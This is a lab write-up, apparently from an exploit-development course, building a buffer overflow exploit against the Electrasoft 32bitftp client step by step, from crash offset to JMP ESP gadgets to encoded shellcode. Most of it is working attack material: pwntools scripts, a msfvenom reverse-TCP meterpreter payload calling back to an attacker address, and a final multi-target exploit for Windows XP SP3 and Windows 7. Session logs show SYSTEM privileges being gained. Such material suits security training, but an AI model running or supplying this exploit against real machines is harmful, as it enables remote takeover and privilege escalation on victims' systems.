Exploit development
===================
Stage 1: Verifying the exploitable condition
--------------------------------------------

Using Immunity debugger and Python, we will verify if our client application is vulnerable and if it is, we will figure out how large our buffer needs to be to trigger our overflow.

```
from pwn import *

buf = "A" * 2000

l = listen(21)
conn = l.wait_for_connection()
conn.sendline('220 ' + buf + '\r\n')
conn.recv()
```

We see we can control EIP as it is set to 0x41414141 (or "AAAA")

![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s1.PNG "")


Stage 2: Finding the crash offset
---------------------------------
```
from pwn import *
import subprocess

print "[+] Generating payload."
buf = subprocess.check_output(['/usr/share/metasploit-framework/tools/exploit/pattern_create.rb','1500'])

l = listen(21)
conn = l.wait_for_connection()
conn.sendline('220 ' + buf + '\r\n')
conn.recv()
```

![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s2.PNG "")

Now our EIP value is set to 0x30684239, lets use pattern_offset.rb to find out how far into our buffer that sequence exists:

```
root@ubuntu:~/ecppt/labs/lab1# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 30684239
[*] Exact match at offset 989
```

Stage 3: Find a JMP ESP gadget
------------------------------
```
root@ubuntu:~/ecppt/labs/lab1# msfpescan -j esp 32bitftp.exe 

[32bitftp.exe]
0x0040fbc1 push esp; retn 0x0008
0x0044d701 push esp; retn 0x000c
0x0045eb3b jmp esp
0x0045fa3b jmp esp
0x004c00dd jmp esp
0x004c04cb jmp esp
0x004c1a11 jmp esp
0x004c1c3f jmp esp
0x004c1d5b jmp esp
0x004c20b9 jmp esp
0x004c2325 jmp esp
0x004c245d jmp esp
0x004c320b jmp esp
0x004c350f jmp esp
0x004c360f jmp esp
0x004c3f81 jmp esp
0x004c5a65 jmp esp
0x004c7ce5 jmp esp
0x004c7d21 jmp esp
0x004cb7fb jmp esp
0x004cd3cf jmp esp
0x004ce083 jmp esp
0x004cedd5 jmp esp
0x004cefe7 jmp esp
0x004ceffd jmp esp
0x004d0aad jmp esp
0x004d188c push esp; ret
0x004d8ffb jmp esp
```

All of these have nulls in them, so we need to validate if null is fine in our buffer.

We're gonna test by setting the EIP value to our JMP ESP and setting a breakpoint to see if it reaches it.

![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s3_1.PNG "")

```
from pwn import *

buf = "A" * 989					# our eip begins @ 989 bytes 
buf += p32(0x0045eb3b)			# jmp esp in 32bitftp.exe
buf += "A" * (2000 - len(buf))	# pad to 2000 bytes

l = listen(21)
conn = l.wait_for_connection()
conn.sendline('220 ' + buf + '\r\n')
conn.recv()

```

![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s3_2.PNG "")

We see that our EIP value was set to 0x3e45eb3b instead of 0x0045eb3b meaning our null byte was not sucessfully passed throught the FTP client onto the stack. So we need to find a JMP esp in a loaded segment without null bytes.

I also want to avoid the \n and \r characters (0x0a and 0x0d) as these also have a special meaning to an FTP client in that it's reached the end of a line.

We examine the loaded modules and see quite a number that have longer 32bit addresses:

![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s3_3.PNG "")

We try ntdll.dll and using msfpescan find a push esp; ret ROP gadget at 0x7c919db0: 

```
root@ubuntu:~/ecppt/labs/lab1# msfpescan -j esp ntdll.dll 

[ntdll.dll]
0x7c919db0 push esp; ret

```

I update the exploit to use this address:

```
from pwn import *

buf = "A" * 989					# our eip begins @ 989 bytes 
buf += p32(0x7c919db0)			# push esp; ret in ntdll.dll
buf += "A" * (2000 - len(buf))	# pad to 2000 bytes

l = listen(21)
conn = l.wait_for_connection()
conn.sendline('220 ' + buf + '\r\n')
conn.recv()

```

I set a breakpoint at the 0x7c919db0 address and see we've successfully got our execution control pointing to our buffer of "A"s:

![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s3_4.PNG "")

Stage 4: Introduce Shellcode
----------------------------

I'm using msfvenom to generate a payload for windows/meterpreter/reverse_tcp and use shikata_ga_nai to encode away badcharacters which I identified as:

* 0x00,0x0a,0x0d

```
root@ubuntu:~/ecppt/labs/lab1# msfvenom -n 8 -e x86/shikata_ga_nai -p windows/meterpreter/reverse_tcp LHOST=192.168.206.132 LPORT=4444 -b \x00\x0a\x0d -f py
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai chosen with final size 360
Successfully added NOP sled from x86/single_byte
Payload size: 368 bytes
buf =  ""
buf += "\x4a\x91\x2f\x49\x4a\x98\x48\x43\xdd\xc1\xba\x0c\x13"
buf += "\x64\xd7\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x54\x31\x53"
buf += "\x18\x83\xc3\x04\x03\x53\x18\xf1\x91\x2b\xc8\x77\x59"
buf += "\xd4\x08\x18\xd3\x31\x39\x18\x87\x32\x69\xa8\xc3\x17"
buf += "\x85\x43\x81\x83\x1e\x21\x0e\xa3\x97\x8c\x68\x8a\x28"
buf += "\xbc\x49\x8d\xaa\xbf\x9d\x6d\x93\x0f\xd0\x6c\xd4\x72"
buf += "\x19\x3c\x8d\xf9\x8c\xd1\xba\xb4\x0c\x59\xf0\x59\x15"
buf += "\xbe\x40\x5b\x34\x11\xdb\x02\x96\x93\x08\x3f\x9f\x8b"
buf += "\x4d\x7a\x69\x27\xa5\xf0\x68\xe1\xf4\xf9\xc7\xcc\x39"
buf += "\x08\x19\x08\xfd\xf3\x6c\x60\xfe\x8e\x76\xb7\x7d\x55"
buf += "\xf2\x2c\x25\x1e\xa4\x88\xd4\xf3\x33\x5a\xda\xb8\x30"
buf += "\x04\xfe\x3f\x94\x3e\xfa\xb4\x1b\x91\x8b\x8f\x3f\x35"
buf += "\xd0\x54\x21\x6c\xbc\x3b\x5e\x6e\x1f\xe3\xfa\xe4\x8d"
buf += "\xf0\x76\xa7\xd9\x35\xbb\x58\x19\x52\xcc\x2b\x2b\xfd"
buf += "\x66\xa4\x07\x76\xa1\x33\x68\xad\x15\xab\x97\x4e\x66"
buf += "\xe5\x53\x1a\x36\x9d\x72\x23\xdd\x5d\x7b\xf6\x48\x5b"
buf += "\xeb\x39\x24\xad\x6f\xd1\x37\x32\x7e\x7e\xb1\xd4\xd0"
buf += "\x2e\x91\x48\x90\x9e\x51\x39\x78\xf5\x5d\x66\x98\xf6"
buf += "\xb7\x0f\x32\x19\x6e\x67\xaa\x80\x2b\xf3\x4b\x4c\xe6"
buf += "\x79\x4b\xc6\x03\x7d\x05\x2f\x61\x6d\x71\x4e\x89\x6d"
buf += "\x81\xfb\x89\x07\x85\xad\xde\xbf\x87\x88\x29\x60\x78"
buf += "\xff\x29\x67\x86\x7e\x18\x13\xb0\x14\x24\x4b\xbc\xf8"
buf += "\xa4\x8b\xea\x92\xa4\xe3\x4a\xc7\xf6\x16\x95\xd2\x6a"
buf += "\x8b\x03\xdd\xda\x7f\x84\xb5\xe0\xa6\xe2\x19\x1a\x8d"
buf += "\x71\x5d\xe4\x53\x57\xc6\x8d\xab\xd7\xf6\x4d\xc6\xd7"
buf += "\xa6\x25\x1d\xf8\x49\x86\xde\xd3\x01\x8e\x55\xb5\xe0"
buf += "\x2f\x69\x9c\xa5\xf1\x6a\x12\x7e\xe7\xe4\xd5\x81\x08"
buf += "\x07\xea\x57\x31\x7d\x2b\x64\x06\x8e\x06\xc9\x2f\x05"
buf += "\x68\x5d\x2f\x0c"
```

Our final exploit now looks like this:

```
#!/usr/bin/python
# 
# Electrasoft FTP Client exploit
# Author: Kris Hunt 
#
# Target: Windows XP SP3

from pwn import *

buf = "A" * 989			# our eip begins @ 989 bytes 
buf += p32(0x7c919db0)		# push esp; ret in ntdll.dll

# shellcode, reverse meterpreter, port 4444
buf += "\x4a\x91\x2f\x49\x4a\x98\x48\x43\xdd\xc1\xba\x0c\x13"
buf += "\x64\xd7\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x54\x31\x53"
buf += "\x18\x83\xc3\x04\x03\x53\x18\xf1\x91\x2b\xc8\x77\x59"
buf += "\xd4\x08\x18\xd3\x31\x39\x18\x87\x32\x69\xa8\xc3\x17"
buf += "\x85\x43\x81\x83\x1e\x21\x0e\xa3\x97\x8c\x68\x8a\x28"
buf += "\xbc\x49\x8d\xaa\xbf\x9d\x6d\x93\x0f\xd0\x6c\xd4\x72"
buf += "\x19\x3c\x8d\xf9\x8c\xd1\xba\xb4\x0c\x59\xf0\x59\x15"
buf += "\xbe\x40\x5b\x34\x11\xdb\x02\x96\x93\x08\x3f\x9f\x8b"
buf += "\x4d\x7a\x69\x27\xa5\xf0\x68\xe1\xf4\xf9\xc7\xcc\x39"
buf += "\x08\x19\x08\xfd\xf3\x6c\x60\xfe\x8e\x76\xb7\x7d\x55"
buf += "\xf2\x2c\x25\x1e\xa4\x88\xd4\xf3\x33\x5a\xda\xb8\x30"
buf += "\x04\xfe\x3f\x94\x3e\xfa\xb4\x1b\x91\x8b\x8f\x3f\x35"
buf += "\xd0\x54\x21\x6c\xbc\x3b\x5e\x6e\x1f\xe3\xfa\xe4\x8d"
buf += "\xf0\x76\xa7\xd9\x35\xbb\x58\x19\x52\xcc\x2b\x2b\xfd"
buf += "\x66\xa4\x07\x76\xa1\x33\x68\xad\x15\xab\x97\x4e\x66"
buf += "\xe5\x53\x1a\x36\x9d\x72\x23\xdd\x5d\x7b\xf6\x48\x5b"
buf += "\xeb\x39\x24\xad\x6f\xd1\x37\x32\x7e\x7e\xb1\xd4\xd0"
buf += "\x2e\x91\x48\x90\x9e\x51\x39\x78\xf5\x5d\x66\x98\xf6"
buf += "\xb7\x0f\x32\x19\x6e\x67\xaa\x80\x2b\xf3\x4b\x4c\xe6"
buf += "\x79\x4b\xc6\x03\x7d\x05\x2f\x61\x6d\x71\x4e\x89\x6d"
buf += "\x81\xfb\x89\x07\x85\xad\xde\xbf\x87\x88\x29\x60\x78"
buf += "\xff\x29\x67\x86\x7e\x18\x13\xb0\x14\x24\x4b\xbc\xf8"
buf += "\xa4\x8b\xea\x92\xa4\xe3\x4a\xc7\xf6\x16\x95\xd2\x6a"
buf += "\x8b\x03\xdd\xda\x7f\x84\xb5\xe0\xa6\xe2\x19\x1a\x8d"
buf += "\x71\x5d\xe4\x53\x57\xc6\x8d\xab\xd7\xf6\x4d\xc6\xd7"
buf += "\xa6\x25\x1d\xf8\x49\x86\xde\xd3\x01\x8e\x55\xb5\xe0"
buf += "\x2f\x69\x9c\xa5\xf1\x6a\x12\x7e\xe7\xe4\xd5\x81\x08"
buf += "\x07\xea\x57\x31\x7d\x2b\x64\x06\x8e\x06\xc9\x2f\x05"
buf += "\x68\x5d\x2f\x0c"
buf += "A" * (2000 - len(buf))	# pad to 2000 bytes

l = listen(21)
conn = l.wait_for_connection()
conn.sendline('220 ' + buf + '\r\n')
conn.recv()
```

Which we run and successfully get a reverse_tcp meterpreter shell:

```
[*] Started reverse TCP handler on 192.168.206.132:4444 
[*] Starting the payload handler...
[*] Sending stage (957487 bytes) to 192.168.206.131
[*] Meterpreter session 1 opened (192.168.206.132:4444 -> 192.168.206.131:1184) at 2016-01-22 19:46:20 -0800

meterpreter > sysinfo
Computer        : KRIS-5AB5C15869
OS              : Windows XP (Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter > getuid
Server username: KRIS-5AB5C15869\Administrator
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > 
```

Stage 6: Porting Exploit to Windows 7 (x86)
-------------------------------------------
For fun let's try our exploit out against Windows 7. This FTP client is old but still installs on Windows 7. Is it vulnerable to the same old tricks?

Well it still crashes when sent 2000 x "A":

![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s6.PNG "")

And according to Immunity on the Windows 7 box, EIP is still under our direct control.

![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s6_1.PNG "")

So let's find a non-null containing JMP ESP gadget and try it! Examining the executable modules list, let's try ntdll.dll again eh?

![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s6_2.PNG "")

For your reference, this client is Windows 7 Professional SP1 32 bit:

![alt text](https://github.com/sourcekris/PTPv3/raw/master/lab1/s6_3.PNG "")

```
root@ubuntu:~/ecppt/labs/lab1# msfpescan -j esp ntdll-win7sp1.dll 

[ntdll-win7sp1.dll]
0x77ec18a7 push esp; retn 0x0009
0x77ee52b6 push esp; retn 0x0004
0x77f1e871 jmp esp
0x77f472d9 jmp esp
0x77f4fcc6 push esp; retn 0x8b02
0x77f4feb3 push esp; retn 0x8b02
0x77f60ad0 jmp esp
```

Let's use 0x77f1e871 (which is actually loaded at **0x7775e871** according to the Immunity debugger's "Executable modules" window and a bit of Binary string searching) and make a small adjustment to the exploit to target both XP or Win7:

```
#!/usr/bin/python
# 
# Electrasoft FTP Client exploit
# Author: Kris Hunt 
#
# Targets: 
# 1 - Windows XP SP3
# 2 - Windows 7 SP1 x86
from pwn import *
import sys

if len(sys.argv) < 2: 
	print "Usage: %s <target>" % sys.argv[0]
	print "Targets: 1 = XP SP3, 2 = Win7 SP1 x86"
	quit()

buf = "A" * 989			# our eip begins @ 989 bytes 

if sys.argv[1] == '1':
	buf += p32(0x7c919db0)	# push esp; ret in ntdll.dll xpsp3
else:
	buf += p32(0x7775e871)	# jmp esp in ntdll.dll win7

# shellcode, reverse meterpreter, port 4444
buf += "\x4a\x91\x2f\x49\x4a\x98\x48\x43\xdd\xc1\xba\x0c\x13"
buf += "\x64\xd7\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x54\x31\x53"
buf += "\x18\x83\xc3\x04\x03\x53\x18\xf1\x91\x2b\xc8\x77\x59"
buf += "\xd4\x08\x18\xd3\x31\x39\x18\x87\x32\x69\xa8\xc3\x17"
buf += "\x85\x43\x81\x83\x1e\x21\x0e\xa3\x97\x8c\x68\x8a\x28"
buf += "\xbc\x49\x8d\xaa\xbf\x9d\x6d\x93\x0f\xd0\x6c\xd4\x72"
buf += "\x19\x3c\x8d\xf9\x8c\xd1\xba\xb4\x0c\x59\xf0\x59\x15"
buf += "\xbe\x40\x5b\x34\x11\xdb\x02\x96\x93\x08\x3f\x9f\x8b"
buf += "\x4d\x7a\x69\x27\xa5\xf0\x68\xe1\xf4\xf9\xc7\xcc\x39"
buf += "\x08\x19\x08\xfd\xf3\x6c\x60\xfe\x8e\x76\xb7\x7d\x55"
buf += "\xf2\x2c\x25\x1e\xa4\x88\xd4\xf3\x33\x5a\xda\xb8\x30"
buf += "\x04\xfe\x3f\x94\x3e\xfa\xb4\x1b\x91\x8b\x8f\x3f\x35"
buf += "\xd0\x54\x21\x6c\xbc\x3b\x5e\x6e\x1f\xe3\xfa\xe4\x8d"
buf += "\xf0\x76\xa7\xd9\x35\xbb\x58\x19\x52\xcc\x2b\x2b\xfd"
buf += "\x66\xa4\x07\x76\xa1\x33\x68\xad\x15\xab\x97\x4e\x66"
buf += "\xe5\x53\x1a\x36\x9d\x72\x23\xdd\x5d\x7b\xf6\x48\x5b"
buf += "\xeb\x39\x24\xad\x6f\xd1\x37\x32\x7e\x7e\xb1\xd4\xd0"
buf += "\x2e\x91\x48\x90\x9e\x51\x39\x78\xf5\x5d\x66\x98\xf6"
buf += "\xb7\x0f\x32\x19\x6e\x67\xaa\x80\x2b\xf3\x4b\x4c\xe6"
buf += "\x79\x4b\xc6\x03\x7d\x05\x2f\x61\x6d\x71\x4e\x89\x6d"
buf += "\x81\xfb\x89\x07\x85\xad\xde\xbf\x87\x88\x29\x60\x78"
buf += "\xff\x29\x67\x86\x7e\x18\x13\xb0\x14\x24\x4b\xbc\xf8"
buf += "\xa4\x8b\xea\x92\xa4\xe3\x4a\xc7\xf6\x16\x95\xd2\x6a"
buf += "\x8b\x03\xdd\xda\x7f\x84\xb5\xe0\xa6\xe2\x19\x1a\x8d"
buf += "\x71\x5d\xe4\x53\x57\xc6\x8d\xab\xd7\xf6\x4d\xc6\xd7"
buf += "\xa6\x25\x1d\xf8\x49\x86\xde\xd3\x01\x8e\x55\xb5\xe0"
buf += "\x2f\x69\x9c\xa5\xf1\x6a\x12\x7e\xe7\xe4\xd5\x81\x08"
buf += "\x07\xea\x57\x31\x7d\x2b\x64\x06\x8e\x06\xc9\x2f\x05"
buf += "\x68\x5d\x2f\x0c"
buf += "A" * (2000 - len(buf))	# pad to 2000 bytes

l = listen(21)
conn = l.wait_for_connection()
conn.sendline('220 ' + buf + '\r\n')
conn.recv()
```

Let's start it and wait for our client:

```
root@ubuntu:~/ecppt/labs/lab1# ./s6.py 
Usage: ./s6.py <target>
Targets: 1 = XP SP3, 2 = Win7 SP1 x86
root@ubuntu:~/ecppt/labs/lab1# ./s6.py 2
[+] Trying to bind to 0.0.0.0 on port 21: Done
````

And there we go, we also get a shell on the Windows 7 SP1 system:

```
[*] Started reverse TCP handler on 192.168.206.132:4444 
[*] Starting the payload handler...
[*] Sending stage (957487 bytes) to 192.168.206.128
[*] Meterpreter session 2 opened (192.168.206.132:4444 -> 192.168.206.128:49181) at 2016-01-22 20:34:36 -0800

meterpreter > sysinfo
Computer        : WIN-O1E9EN9LOIN
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/win32
meterpreter > getuid
Server username: WIN-O1E9EN9LOIN\admin
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```


